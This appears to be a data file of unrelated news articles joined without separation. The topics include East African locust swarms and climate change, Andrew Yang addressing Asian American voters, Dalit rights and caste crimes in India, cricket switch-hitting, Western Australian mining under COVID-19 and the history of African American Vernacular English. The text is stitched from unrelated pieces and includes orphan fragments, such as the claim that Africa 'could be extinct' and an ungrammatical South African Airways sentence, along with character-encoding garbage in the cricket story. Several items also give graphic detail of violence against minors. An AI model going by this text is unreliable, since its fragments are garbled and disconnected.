0,"Huge swarms of desert locusts are advancing across the Horn of Africa, threatening crops that millions of people depend on for food. UN Food and Agricultural Organisation (FAO) Director-General Qu Dongyu has called this “a situation of international dimensions that threatens the food security of the entire subregion.” The unprecedented scale of this infestation has been fueled by climate change, which has contributed to ocean conditions favorable for the unusually high number of cyclones (8 in 2019) and extreme rainfall in the region, creating ideal breeding conditions for locusts. For many, the word ‘locusts’ conjures up images of a biblical plague. And, indeed, these are among the oldest migratory pests in the world. Although they are related to and look like grasshoppers, their behavior is decidedly more devastating when they enter their so-called ‘gregarious’ phase. When food and environmental conditions are favorable, locusts congregate in swarms that can travel hundreds of miles. They are ravenous eaters, capable of decimating pasture and food crops quickly. The desert locust (Schistocerca gregaria) is the most damaging of the species. While locusts have always existed in the areas affected by the current crisis, the scale and rapid spread of this infestation are exceptional. And with many millions of people in harm’s way, the potential repercussions for food security and livelihoods are grim—which is why the FAO, local governments and humanitarian organizations are sounding the alarm. This locust crisis has been building for a few months now, dating back to last summer. But it has now reached proportions that have not been seen in over 70 years in Kenya and 25 years in the Horn of Africa. Kenya, Ethiopia and Somalia are among the countries worst affected. Djibouti, Egypt, Eritrea, Sudan and Uganda could also face increasing risks if the threat is not quickly contained. Locust swarms have also been a menace in India, Iran, Oman, Pakistan and Yemen. Map of the current situation of the desert locust infestation, Jan 28 2020. In Africa, the swarms cover a rapidly growing area. According to the FAO, swarms can move 150 kilometers (about 90 miles) a day, a similar distance as the crow flies between Washington DC and Richmond, VA. The size of these swarms is hard to comprehend from a distance. An article in the Washington Post noted: “A single swarm can contain up to 150 million locusts per square kilometer of farmland, an area the size of almost 250 football fields, regional authorities say. One especially large swarm in northeastern Kenya measured 60 kilometers long by 40 kilometers wide (37 miles long by 25 miles wide).” (That is nearly 90% of the land area of Rhode Island!) Alarmingly, left unchecked, the crisis is likely to grow a lot worse. Rains starting in March are expected to continue to favor rapid breeding of the locusts and could cause their numbers to grow 500 times by June! While desert locusts are known to affect this area, the conditions being experienced now are exceptional. According to the FAO and the World Meteorological Organization, the heavy rains and devastating cyclones that affected Eastern Africa last fall are major contributing factors. These wet conditions have provided the perfect habitat and food for locusts to thrive. An ocean circulation pattern called the Indian Ocean Dipole (IOD)—which affects weather from Eastern Africa to Australia—had a “positive” phase in 2019 that was the strongest in 60 years. Evidence is mounting that strong positive phases of the IOD occur more often with climate change. The strong temperature difference on opposite sides of the Indian Ocean, associated with the positive phase of the IOD, contributed to the conditions leading up to the devastating Australian bushfires and severe rain and flooding in East Africa. In March and April 2019 Cyclones Idai and Kenneth—which hit within 6 weeks of each other—caused devastating flooding in Mozambique, Malawi and Zimbabwe. Over a thousand people lost their lives. Cyclone Idai ranks as one of the deadliest storms to hit the Southern hemisphere. The extreme wet weather created conditions that were very favorable for the locusts to reproduce and multiply quickly, including promoting vegetation in normally arid areas for them to feed on. Climate scientists and experts on the ground have emphasized these connections in their comments. According to Guleid Artan, director of IGAD’s Climate Predictions and Applications Center. “The Desert Locust outbreak was clearly worsened by the unusually heavy rains experienced in the region. This has been a year of extremes and climate anomalies for East Africa, a region that hosts some of the most vulnerable populations of the world. 2019 brought us unusual cyclonic activity – 8 cyclones, the highest number in a single year since 1976, forming over the northern Indian Ocean -, droughts, floods and a desert locust outbreak. Our Climate is changing and it is already leading to hundreds of casualties and affecting the livelihoods of millions of people in our region” Nairobi-based climate scientist Abubakr Salih Babiker was quoted in an AP story: Heavy rains in East Africa made 2019 one of the region’s wettest years on record, said Nairobi-based climate scientist Abubakr Salih Babiker. He blamed rapidly warming waters in the Indian Ocean off Africa’s eastern coast, which also spawned an unusual number of strong tropical cyclones off Africa last year. Heavy rainfall and warmer temperatures are favorable conditions for locust breeding and in this case the conditions have become “exceptional,” he said. Desert locust (Schistocerca gregaria) The East Africa region already faces high levels of food insecurity, with over 19 million people in Crisis (measured as Phase 3 or above on the Integrated Food Security Phase Classification or IPC scale), according to the October 2019-Januray 2020 outlook from the Famine Early Warning Systems Network. And climate change is making things worse. The 2018 IPCC special report on the impacts of global warming of 1.5C highlighted the many ways climate change threatens food security. We have already increased average global temperatures by a little over 1 degree Celsius and are witnessing a range of changes around the world in worsening risks of drought, extreme rainfall, flooding, wildfire and destructive storms, all climate extremes that can destroy crops and kill livestock. This latest locust crisis in East Africa underscores that the threat to people’s food security is here and now. Many of the places in Eastern Africa that are affected by the locust plague—including Ethiopia and Sudan—had been experiencing a prolonged multi-year drought prior to this, which had already placed a severe stress on food security. And now, cascading climate impacts—drought, followed by extreme rain, followed by a plague of locusts—are set to take a devastating toll on regions and people that simply do not have the resources to cope. The FAO has estimated that there is an immediate urgent need for at least $70 million for Ethiopia, Kenya and Somalia to take steps to limit the spread of locusts and to protect people’s livelihoods. Money is desperately needed for rapid assessments of the locust threat as it advances and for aerial spraying to limit the infestation. More will be needed to help those on the ground to rebuild livelihoods and ensure access to adequate food supplies in the months to come. Longer term needs in these countries and others affected must also be addressed. As the UN has pointed out, there is a narrow window to act to contain the crisis ahead of the next period of rain. Aid must flow quickly. At a briefing today, FAO chief Qu Dong said: “If after April the money has come, it’s somehow useless. So the timing, location, is crucial.” USAID, NASA, NOAA and other US agencies have long played an important role in contributing to global early warning systems, monitoring, and ongoing assistance to cope with these kinds of humanitarian crises. Our government must step up to do more now in this hour of crisis. This is a matter of life and death for millions of people. The bigger picture challenge is clear: we must act swiftly to limit the harms from further climate change. We must cut our heat-trapping emissions rapidly, in line with what the science shows is necessary. We must invest in climate resilience—both at home and in least developed nations enduring the ravages of climate change. We, the more affluent nations most responsible for carbon emissions to-date, also bear responsibility for the pain and suffering we are inflicting on people across the world right now—suffering which inevitably falls hardest on those who have the least and live on the edge of subsistence already. The US has a unique responsibility as a rich nation that is responsible for a leading share of the heat-trapping emissions that are fueling the changes to our climate we see today. And right now, our government is completely failing to do its part—even worse, it is actively trying to undermine global and domestic climate action. As we lay the groundwork for future climate policy in the US, let’s not forget our international obligations.

0,"A leading-edge research firm focused on digital transformation. Good Subscriber Account active since  Former Democratic Presidential candidate Andrew Yang rallied Asian Americans to vote against Donald Trump in what he said could be a political gamechanger for the often overlooked community. ""If we get out in force and help Joe and Kamala win, this could be the major political awakening that Asian Americans have been waiting for a generation or more,"" Yang said Monday night in a virtual fundraiser for Asian Americans Against Trump. Yang was joined by prominent Asian American leaders and public figures, including Democratic Reps. Ro Khanna and Grace Meng, Lost actor Daniel Dae Kim, Pachinko author Min Jin Lee. The American entrepreneur said Asian Americans have been ""forced to become more engaged"" politically as they continue to suffer attacks from the ""hostility"" targeting the Asian American and Pacific Islanders (AAPI) community during the coronavirus pandemic. Many Asian Americans have been vulnerable to racist attacks, as President Donald Trump has used misleading and racist terms to describe the virus which experts said exacerbates microaggressions targeting the AAPI community. Yang said engaging with politics is a ""non-choice"" and an obligation for AAPI voters. ""We have to roll our sleeves up and do things we have not done as a community as high of a level as, frankly, people in other communities,"" Yang said. ""Our community can be the margin of victory and help elect Joe Biden and Kamala Harris, our first Asian-American and Black woman vice president,"" NY Rep. Meng said. Asian American voters are the fastest-growing voting bloc with over 11 million eligible voters. California Rep. Khanna warned that ""anyone who thinks this election is not going to be very close, [is] underestimating Donald Trump's power to do everything possible to win. He's frankly mobilizing the power of the US government on behalf of his campaign"" and told Asian American voters that ""the only way we overcome that is by a massive turnout."" But to mobilize Asian American voters, the AAPI community must actively dispel the model minority myth, which is ""used by leaders to either be a wedge against other people of color or they are being used as some sort of pestilence,"" Lee said. Stereotyping Asian Americans as educated and hard-working, the model minority myth limits Asian Americans as people who are perfectly suited to be led, but not necessarily lead themselves. At the same time, the model minority myth does not capture the challenges that Asian Americans face and paints them under a monolithic narrative that is used as a wedge to pit them against other minorities. ""We still are in that place where we are expected to be the model minority, we are expected to be the ones who work hard, do really great work but never be the leaders,"" Kim said. ""If we can get the message out to other Asian Americans to have a say and a stake in the country where we live â€” we will be much more respected, much more powerful, and much more considered when it comes to the politics of our country.""

0,"By Our Representative The Dalit Adivasi Shakti Adhikar Manch (DASAM), a civil rights network, has demanded that “the due process” for the Prohibition of Employment as Manual Scavengers and their Rehabilitation (Amendment) Bill, 2020, scheduled for in current session of Parliament, should be followed before passing it.Pointing out that public consultation and Parliamentary Standing Committee are the established rules of procedure, which have not been followed, DASAM, in a statement, said, it “condemns” the arbitrary approach of the government for coming up with the Bill, which seeks “complete mechanisation of sewer cleaning and a proposal of introduction of ways for on site protection and compensation of the manual scavengers in case of sewer death.”The bill, said the statement, is through the Social Justice and Empowerment Ministry’s National Action Plan, which asks the making of existing law, passed in 2013, tighter even as seeking the eradication of the manual scavenging practice by “managing” the unsewered areas with better plans through faecal sludge management system. This bill acts makes the construction of insanitary latrines an offense and calls for the conversion of all insanitary latrines within a stipulated time frame. It bans employment of people as manual scavengers for cleaning of insanitary latrines and cleaning of sewers and septic tanks without protective gear. The statement regrets that while in 1955, the Protection of Civil Rights Act was passed for the abolition of scavenging or sweeping on grounds of untouchability, only in 1989, the Prevention of Atrocities Act became an integrated guard for sanitation workers, recognising that more than 90 percent of people employed as manual scavengers belong to the scheduled castes. It was only in 1993 that the Employment of Manual Scavengers and Construction of Dry Latrines (Prohibition) Act was passed seeking stricter stance against the employment of manual scavengers, but as this Act had its limitations. The 2003 CAG report observed, the Act “has failed to achieve its objectives even after 10 years of implementation.” A decade later, Parliament passed the Prohibition of Employment as Manual Scavengers Act, 2013 with greater emphasis on rehabilitation of manual scavengers, yet the hiring of manual scavengers for the work of cleaning the septic tanks, directly or contractually, continued.

Ian Chappell wants shots like this from Glenn Maxwell outlawed.Source:Getty Images Itâ€™s only taken two one-dayers for Ian Chappellâ€™s first angry rant of the summer. The former Australian captain has unloaded his frustration at batting tactics employed by Glenn Maxwell and David Warner he believes are blatantly unfair. Maxwell in particular is one of the finest exponents of switch-hitting, where a batsman faces up in his normal position before moving his feet â€“ and sometimes altering his grip â€“ to effectively swap his stance. Chappell conceded it was â€œamazingly skilfulâ€ but insisted it wasnâ€™t fair on the bowler after two run-fests at the SCG to open the series. â€œHow can one side of the game, ie. the bowlers, they have to tell the umpire how theyâ€™re going to bowl. And yet the batsman, he lines up as a right-hander â€“ Iâ€™m the fielding captain, I place the field for the right-hander â€“ and before the ballâ€™s been delivered, the batsman becomes a left-hander,â€ Chappell told nine.com.au. â€œOne of the main reasons why heâ€™s becoming a left-hander is so he can take advantage of those field placings. Iâ€™d love the administrators who made those laws, Iâ€™d love them to explain to me how thatâ€™s fair.â€ Chappell encouraged India to revolt against the practice by challenging the on-field umpire. â€œI just canâ€™t believe the players donâ€™t arc-up about it. If Iâ€™m captain, Iâ€™m going to take the ball myself and Iâ€™m going to tell the umpire Iâ€™m bowling right-arm over [the wicket], and then Iâ€™m going to run in and bowl around,â€ he said. â€œObviously the umpireâ€˜s going to complain and Iâ€™m going to say, â€™Well, you stop him (the batsman) doing something I think is totally unfair and Iâ€™ll stop doing something unfairâ€™. If the administrators arenâ€™t smart enough to change it, then my attitude always was, â€˜Well, Iâ€™ll take the law into my own handsâ€™.â€ Glenn Maxwell positions himself for a switch hit. (Photo by Mark Kolbe/Getty Images)Source:Getty Images Chappell suggested a solution to the problem that wouldnâ€™t result in the tactic being completely lost from the game. â€œItâ€™s very simple â€¦ All youâ€™ve got to say is that if the batsman changes the order of his hands or his feet [as the bowler runs in], then itâ€™s an illegal shot,â€ Chappell said. â€œ(But) if the batsmanâ€™s right-handed and wants to play switch-hit [in advance of the bowler running in], any bowler worth his salt will say, â€˜Go for your life, mate, Iâ€™ll take my chancesâ€™. But when he completely becomes the opposite-handed batsman to what he faces up as, then itâ€™s not fair. â€œIf heâ€™s good enough to do it by excellent footwork or whatever other means he can devise, I donâ€™t have a problem with it. But when itâ€™s blatantly unfair, it annoys the hell out of me.â€ A NOTE ABOUT RELEVANT ADVERTISING: We collect information about the content (including ads) you use across this site and use it to make both advertising and content more relevant to you on our network and other sites.

Following the devastation of covid-19 unleashed on the West by the coronavirus outbreak, many warned and feared Africa could be extinct should the pandemic spread to the continent.

0,"Everything is Written Here NACDOR (National Confederation of Dalit and Adivasi Organisatons) made a public appeal to Prime Minister Narendra Modi and said it wants the government to bring a legislation in the upcoming monsoon session of Parliament to guarantee jobs to educated youth or an allowance in the lines of minimum wages paid to workers under the MNREGA. The umbrella organisation said it has prepared a draft legislation to be submitted to the Centre and will be writing to PM Modi formally within a couple of days. “The country has been facing a huge job deficit. This has now gone up manifold due to the coronavirus pandemic. It has led to severe distress, demoralisation and even depression in some cases among educated youth throughout the country. In view of this, NACDAOR appeals to the Central Government to enact a law in the upcoming monsoon session of Parliament to guarantee employment for the educated youth and in case of its non-availability, a suitable compensation in accordance to their qualification should be extended to them,” The National Confederation for Dalit and Adivasi Organisations (NACDAOR) urged in a recent statement. According to the recent tally, no less than 14 crore jobs are feared to have been lost in recent months after the coroanavirus outbreak in the country. NACDOR chairman and Dalit activist Ashok Bharti told media that small meetings across the country are being held to communicate the message about the demand and create mass awareness on it."
0," Western Australia’s Minister for Mines and Petroleum Bill Johnston has dismissed suggestions that trade relations between his economic powerhouse state and China may take a hit in the wake of the deadly coronavirus. In a wide-ranging interview with Small Caps, Mr Johnston said after a record year for sales in the resource sector, to the tune of $166 billion, trade between WA and China remained a top priority. “China is a key economic partner for the Western Australian resources industry so if they come back strongly then that will obviously benefit us.” There’s mounting speculation China will recover from the ravages of coronavirus by July and Mr Johnston said the benefits for his state were enormous. “We’ve been lucky, iron ore volumes have remained fairly steady even at the height of the health problems in China and that means there has been some strength in the iron ore price and we’re very pleased with that,” he said. “We have a strong trading relationship with China because it’s in our mutual interests. China needs resources and we are a great low-cost provider of resources.” On top the of the best sales for the sector the industry also employed 133,094 workers in WA, another record, up from 120,511 in 2018. While China’s appetite for Australian resources is unlikely to slow down, Mr Johnston admitted the effects of COVID-19 demonstrated the need to have “strong multiple logistics chains”. He said the battery space was a new window to grow in Western Australia. “We’re very strongly of the view that further processing of raw materials here in Western Australia is a good business case and one of those reasons is that it would allow the users of those materials to have a security of supply rather than relying one logistics chain,” he said. “So, we do think there is a strong reason for a continued chemical processing of battery materials, and we’ve been talking to a range of investors globally and we think that COVID-19 has strongly endorsed the challenges of relying on one logistics partner.” “There is a real opportunity for investment for further processing of battery materials here in Western Australia for the supply of potential domestic users but also for partnering with a whole range of countries for their electric vehicle responses.” With WA’s hard border in place, the state government is determined to limit the spread of COVID-19 particularly in regional and remote areas. Under WA Premier Mark McGowan’s strict lock-out measures, no-one can cross the border into WA unless it’s an essential service.” Fly-in fly-out workers have been given access to come from inter-state, but they must serve the mandatory 14-day quarantine before being allowed on site. According to Mr Johnston, mining companies are doing their bit to comply with the law of the land. “People are moving to longer swings for FIFO work to reduce the number of transport movements. They’re introducing very strict social distancing policies at work camps and are working very hard on their pandemic plans to make sure the virus won’t spread among work groups.” “We are of course exempting workers from the internal Western Australia borders that we’ve established, but again the reduction in movement is very important to our management of the pandemic.” Mr Johnston stopped short, however, in saying he’d shut down an operation if a worker tested positive to COVID-19. “We’ll always respond to any development if there was a worker to be caught with the affliction on site … there are actions to be taken by the company, but the first thing would be to evacuate the worker to hospital or to other care and then isolate the workgroup,” he said. “We’d then have to see what we’d do with the worksite but clearly the first effort is to prevent COVID-19 getting into a work camp.” Meanwhile, there’s growing scepticism about the future of FIFO workforces once the COVID-19 threat wanes with Australian Government Resources Minister Keith Pitt throwing doubt over its practicality. Mr Pitt told a national newspaper this week he felt more and more companies would lean towards establishing residential workforces. It’s a philosophy Mr Johnston partially agrees with but noted WA’s mining operations were often on a different scale compared to those on Australia’s east coast. “Many operations are extremely remote, and there is not really a practical way to do anything other than fly-in fly-out,” he said. “On the other hand for those mines that are closer to established communities we have always called for companies to give people more choice so that if people want to live residentially they can and those who choose a FIFO lifestyle can choose that.” “I’m concerned when I hear about mining companies insisting on workers doing fly-in fly-out from Perth rather than allowing drive-in drive-out say from Port Hedland if that’s a closer community.” “There shouldn’t be an inflexibility from employers to prevent people from living in regional communities if that’s their choice.”   Δdocument.getElementById( ""ak_js"" ).setAttribute( ""value"", ( new Date() ).getTime() ); "
0,"All four accused have since been booked under section 302 of the Indian penal code and the SC/ST Prevention of Atrocities Act. Amroha district in Uttar Pradesh. Photo: Google Maps New Delhi: A 17-year-old Dalit boy was killed by ‘upper caste’ members of his village in Amroha district of Uttar Pradesh on June 6, allegedly because he prayed at a local temple, according to a report in the Times of India. As per the deceased boy’s father, an argument had broken out between four ‘upper caste’ men and the boy after he entered a temple in Dhomkhera village on May 31. “Some people, including Horam Chauhan, a youth from an affluent upper caste family, tried to stop him from entering the temple on the ground of his Jatav identity. But Vikas ignored them and offered prayers there,” Om Prakash Jatav, the father, told The Telegraph. Om Prakash has also alleged that the boy was beaten then and that the police refused to file an FIR. “After he had finished praying, several upper caste villagers thrashed him. We approached the police at the time but they refused to register an FIR,” he said. Also read: Nepal: 4 Dalit Men Killed by Upper Caste Mob, Activists Point to History of Discrimination On Saturday night four men – Lala Chauhan, Horam Chauhan, Jasveer and Bhushan – entered the boy’s home and opened fire. “Hearing the gun shots, we rushed to save Vikas. The four men had fled by then and Vikas was bleeding. He died by the time we reached the hospital,” Om Prakash said. All four accused have been booked under section 302 of the Indian penal code and the SC/ST Prevention of Atrocities Act. “Lala Chauhan and Horam Chauhan have been arrested and the remaining two will be nabbed soon,” a police officer told Times of India. However, the police have also said that the murder was a result of a dispute over money. During the initial probe, it has come to the fore that there was a dispute between Vikas and the accused over money. “The brother of Vikas had taken a mango orchard on rent. Lala and Horam were also partners with him. Later, they fell out after a money dispute. There was a brief fight over it a few days ago,” Vipin Tada, superintendent of police, Amroha, said. Another police officer, Niraj Kumar, an officer in charge of the local police station, also claimed that the primary investigation didn’t suggest any dispute relating to a temple or untouchability. “Our investigation suggests the victim, the killer and other youths were playing in a field seven days ago when a fight broke out between them,” he told The Telagraph."

It’s expected the end of April if the end of South African Airlines, adding to the financial impact COVID-19 has for South Africa and the future of the travel and tourism industry. The airline will sell all remaining assets including two night time slots at London Heathrow Airport. The South African Government had refused additional funding for the National Airline.

Initially an FIR was filed under IPC Sections 307 (attempt to murder), 147 (rioting), 506 (criminal intimidation), 452 (trespass) and relevant Sections of SC/ST Act to be updated with Section 302 (murder) as the victim has died. Uttar Pradesh, has been in the limelight for a massive rise is crimes against women, inlcuding rape, murder, and molestation, espcialy against Dalit women and teenagers. However the state government is now focused on discussing ‘love jihad’. Chief Minister Adityanath has already sounded his ‘warning’ to Hindu-Muslim couples: “I warn those who conceal identity and play with our sisters’ respect. If you don’t mend your ways your ‘Ram naam satya’,” the Hindu funeral chant warning interfaith couples of dire consequences. Crimes against Dalits reported from Uttar Pradesh in the past few weeks include: November 17: Dalit girl gang-raped inside public toilet The victim and her mother alleged that they were forced out of Aliganj police station in the Etah district of Uttar Pradesh when they went to file a complaint in the gang rape case, reported Mirror Now. The victim accused the former village head and two other men for gang-raping her. According to news reports the victim and her family have been running from pillar to post to get justice. According to the news report, the victim has identified three accused as: former village head Rajiv, Anil and Akash. November 14, Fatehpur, Dalit sisters murdered, bodies dumped in pond: Two Dalit sisters, both minors, were killed, and their bodies ere dumped in the village pond in the Asodhar area of the district. The bodies bore injury marks in the eyes and were retrieved from the pond late in the evening, police told the media. The girls aged 12 and eight were from a Dalit family, and had reportedly gone to the fields in the afternoon to fetch vegetables but did not return, reported the Dailyhunt. The family members of the victims have alleged that the assailants killed the girls after an unsuccessful attempt to rape them, said the police. October 14, Barabanki: Teenage Dalit girl’s body found in paddy field The victim’s family suspect rape as they found the half-naked body of their teenage daughter on night of October 14, 2020, in a paddy field where she had gone to work. The Uttar Pradesh’s Barabanki police found her the tied-up and half-naked body of a teenage Dalit girl in the village paddy field. The area is only 40 km from the state capital Lucknow. Media reports quoted Superintendent of Police RS Gautam saying that an initial probe suggested that the girl was strangled by her own shirt. The family members alleged that her semi-naked condition suggested sexual assault too. Gautam said the girl was missing, after she left home to cut paddy crops. The family found her body in the field while searching for her on the same night. The incident occurred in Tipri village within Satrikh police station limits. Police and the administration did not share the post-mortem report but sought the opinion of doctors, who carried out the post-mortem examination, regarding the possibility of rape. October 13, Gonda: Three Dalit sisters, attacked in their sleep with acid Three Dalit sisters, all of them minors, were attacked with acid while they were asleep inside their residence in Uttar Pradesh’s Gonda district. It was a tweet by the Gonda police that made the incident public. The oldest of the three, aged 17, had 35 per cent burn injuries, while the other two, aged 12 and 8, escaped with 25 per cent and 5 percent burn injuries, respectively. The family members told police that at around 2 A.M, all the three sisters came running downstairs, howling in pain. Their father initially thought the burn injuries were from a gas cylinder, but later realised it was an acid attack. The girls’ parents recently fixed the marriage of their eldest daughter, a high school passout. She received the maximum burn injuries out of the three girls. The family does not suspect anyone so far, SP Pandey said, adding that the attacker must be from the same locality as it’s a small town. October 29, Amethi, Dalit man burnt alive by upper-caste men Victim’s family claims that the five men often threatened to extort money from the Panchayat leader. At least three upper-caste men were arrested for allegedly burning alive the husband of Bandoiya village’s Gram Panchayat President in Amethi district. The victim, Arjun Kori, was found outside the house of the accused with burns on 90 percent of his body. He succumbed to his injuries while enroute to a hospital in Lucknow. According to President Chutaka, her husband had gone out to the village square for a cup of tea on Thursday evening. However, he never returned. Chutaka alleged that Krishna Kumar Tiwari and his four friends abducted Arjun and burnt him alive in their front yard. She claimed that Tiwari threatened them to extort money. Tiwari believed that he was entitled to a ‘cut’ of the government money Chhotka supposedly received. However, when they denied the existence of any such money, the five men burnt the man in a fit of rage, said Chutaka. Before his death, Arjun’s family recorded his statement wherein he accused K. K. Tiwari, Ashutosh, Rajesh, Ravi and Santosh for burning him alive. The family registered a case of murder at Munshiganj police station against the five men. October 23, Firozabad district, Dalit teen stalked, molested, shot dead The Class XI student was returning from school when the three men had allegedly molested her, later they followed her home and shot her in the head.

The three men were identified as Manish Yadav, Sopali Yadav and Gaurav Chak. “She had told us about the incident after returning home. At night, we were walking on the terrace after dinner when the youths came on a motorbike, entered our house and shot my daughter. We rushed downstairs and found her lying in a pool of blood. The trio ran away on seeing us,” the father of the 16-year-old girl told police. He told the police that the men had “been molesting and harassing girls in the area for the past several months.” His daughter, just a teenage schoolgirl, had bravely protested when the trio attacked her.

University of Ottawa provides funding as a founding partner of The Conversation CA-FR. University of Ottawa provides funding as a member of The Conversation CA. View all partners After students at a California high school were recently told to “translate” Black English phrases into standard English, a community member at a school board hearing said: “The last thing they need — our children — is to be forced to attend class and to be mocked and bullied by students because of a lesson plan used to highlight African American Vernacular English.” Few dialects of English have garnered so much negative attention. From the classroom to the courtroom, the place of African American Vernacular English is hotly debated. This is because people associate it with linguistic features now denounced as grammatically incorrect, like “double negatives” or verbs that don’t agree with their subjects. For example: You might as well not tell them, ‘cause you ain’t getting no thanks for it. You might as well not tell them nothing about it, only just leave it in the hands of the Lord.  ‘Cause I knows it and I sees it now.  Teachers and language mavens chalk these features up to “bad” English. Some linguists contend that they’re not English, but rather the legacy of an English-based Creole once widespread across British North America. As a sociolinguist specializing in the structure of the spoken language, my team at the University of Ottawa Sociolinguistics Laboratory has been grappling with this issue for years. Our research shows that many of these stereotypical non-standard features are direct offshoots of an older stage of English — that of the British who colonized the United States. To understand how African American Vernacular English got the way it is now, you have to know what it was like before. But historical evidence of an earlier stage is in short supply: recording technology is too recent, and written representations are both scarce and unreliable. To access early Black English, we first had to reconstruct it from the speech of the African American diaspora. In the late 18th and early 19th centuries, thousands of formerly enslaved African Americans settled in small enclaves in Africa, the Caribbean, South America and Canada, where their descendants still reside. Geographically and socially isolated, the key characteristic of linguistic enclaves is that they preserve older features. Three such communities, never before studied in this connection, helped us shed light on the history of African American Vernacular English: Samaná, a small peninsula in the northeastern Dominican Republic, and North Preston and Guysborough in Nova Scotia. Thanks to local residents, we were able to locate and record the oldest members of these communities. Samaná, Dominican Republic  North Preston, Nova Scotia  Guysborough, Nova Scotia  We compared our recordings with others made nearly a century earlier with elderly African Americans born in slavery in the American South. These “Ex-Slave Recordings” allowed us to validate the diaspora materials as an earlier stage. Ex-Slave Recordings  My team and I painstakingly analyzed these materials to detect statistically significant speech patterns, and compared them across different dialects of English. We also assembled nearly 100 grammars of English dating as far back as 1577. Such comparisons enable linguists to reconstruct linguistic ancestry; like evolutionary biologists, we seek shared retentions — features that have stayed the same despite changes elsewhere. This revealed that many of the features stereotypically associated with contemporary African American Vernacular English have a robust precedent in the history of the English language. Consider the present tense. In standard English, only verbs in the third-person singular are inflected with –s, as in “he/she/it understands.” In African American Vernacular English, on the other hand, not only does the verb sometimes remain bare in the third person (e.g. “He understand what I say”), it may also feature –s in other persons, as in, “They always tries to be obedient.” Our research on old grammars taught us that the standard English requirement that subject and verb agree in the third-person singular is actually relatively recent. As far back as 1788, the grammarian James Beattie noted that a singular verb sometimes followed a plural noun — exactly as we find in African American vernacular English today. To our surprise, quantitative analysis of the way speakers used the present tense in our early Black English database showed that they follow a pattern described by the grammarian James Murray in 1873: This pattern, known as the “northern subject rule,” involves leaving the verb bare when the subject is an adjacent pronoun (“They come and take them”) and inflecting it with –s otherwise (“The birds comes and pecks them”). A linguistic pattern as detailed as the northern subject rule could not have been innovated by members of these far-flung communities independently. Rather, our comparisons confirmed that it was inherited from a common source: the English language first learned by enslaved individuals in the U.S. colonies. In fact, the same pattern is heard in other varieties of English with no known African American input or ties, as in this example from Devon, in the United Kingdom: You go off for the day, and gives ‘em fish and chips on the way home. This is far from an isolated example. When we repeated this exercise, we found a historical precedent for many other linguistic features that are today considered grammatically incorrect. Focusing on current differences between African American Vernacular English and standard English leads us down the garden path of concluding that it is “bad” English. But when we factor in history and science, we learn that it retained structures that standard English has now stamped out. Our results show that many salient features of African American Vernacular English were not innovated, but are instead the legacy of an older stage of English. African American Vernacular English should rightly be legitimized as a conservative and not incorrect variety of English, one whose core grammatical difference is its resistance to mainstream change. They speak the same English. The English people talks with grammar.  That’s why, you know, they celebrate that day. Coloured folks celebrates that day.  Oh, I live my life.

0,"TW: Rape A 13-year-old Dalit girl was raped and strangled to death on 14th August, 2020, in the Lakhimpur Kheri district of Uttar Pradesh (UP). In the afternoon of 14th August, the girl went to defecate in a nearby farmland in the Pakaria village of Isanagar area, located at a distance of 130 km from Lucknow. The police have arrested the two accused of the case. The girl had gone missing after she went to relieve herself. Her family started searching for her when she didn’t get back home. They finally found her body in a sugarcane field. It was confirmed later in her postmortem report that she was raped and died of strangulation. The girl’s father stated that her eyes were gouged out, tongue was cut. The UP police, however, affirmed that her postmortem report didn’t show her eyes gouged out or tongue cut. Satyendra Kumar, Superintendent, Kheri district, stated, “Her eyes were not gouged out and tongue was not cut. The claim is not true. There is nothing in the postmortem report to suggest this. There were scratches near the eyes, likely due to the sharp sugarcane leaves, where the body was found.” The police have filed charges against the two accused of rape, murder and also under the National Security Act. The farmland where the girl went for defecation belonged to one of the accused. He had reportedly warned the girl’s family in the past against defecating in his farmland. Opposition parties including the SP and BSP have started questioning the Adityanath government over the increasing number of crimes in the recent days. The UP government is on the radar of the opposition parties since the incidents of rape and kidnapping have risen in the State.

0,"The accused was taken into custody on Tuesday more than two weeks after the incident took place. In yet another shocking incident in Khammam district of Telangana, a minor Dalit girl was burnt by the same community man after he tried to rape her and she resisted, according to officials on Tuesday. The accused was taken into custody on Tuesday more than two weeks after the incident took place. The incident took place on September 18 but it came to light recently. On Monday night, when the local police was informed, they took immediate action of shifting the 13-year-old to Hyderabad's Osmania Government General Hospital with 70 per cent burns.  The 13-year-old minor girl hailing from Pallagudem, near Khammam town, was working as domestic help in the household of a 28-year-old married man named Maraiah who resides in Mustafa Nagar in Khammam town. Both belong to Budiga Jangam, a sub-caste in Dalit community. On September 18, when the victim was doing some domestic work, the accused attempted rape but when the girl raised alarm, the accused poured petrol and set her on fire. At that time only Maraiah's father was at home who rushed to douse the fire but the girl suffered burns all over the body. Maraiah's wife is pregnant and has gone to her parents home for delivery.  Accused Maraiah took the girl to a private hospital in Khammam town where she was being treated since September 18. Though the girl suffered nearly 70 per cent burns, the private hospital did not think it as medico-legal case and did not report it to the police. What happened from September 18 till October 5: It is still not clear why the minor girl's parents did not complain to police on September 18 itself or in next few days. According to some sources in the community, the accused tried to hush up the matter as ""accidental fire'' by saying the victim caught fire as she was trying to light a diya and promised to take care of treatment in the private hospital and pleaded with them not to tell anyone.  However, after 17 days, the ghastly issue came out and as soon as the local police got the news, they swung into action and first the minor girl was immediately shifted to Hyderabad's Osmania Government General Hospital where her condition is serious. Live TV  ""As soon as we got to know about this incident we shifted the minor girl to Hyderabad's Osmania Hospital, taken her statement, taken her parents' statement and booked a case against the accused under sections 376 r/w 511, 307, 354, 506 of IPC and section 10 of POSCO act. We have also nabbed the accused and will be producing him before the magistrate,'' Khammam Assistant Commissioner of Police, Anjaneyulu, told Zee Media. The police is also awaiting a report from District Medical & Health Officer ( DHMO ) to book a case against the private hospital where the victim was being treated from September 18. ""We have asked the DHMO to give a report on this hospital after inquiry and we are also consulting our legal team on how to proceed against this private hospital. Also, in the main case against the accused we are trying to add Child Labour Act sections,'' the ACP added. By continuing to use the site, you agree to the use of cookies.

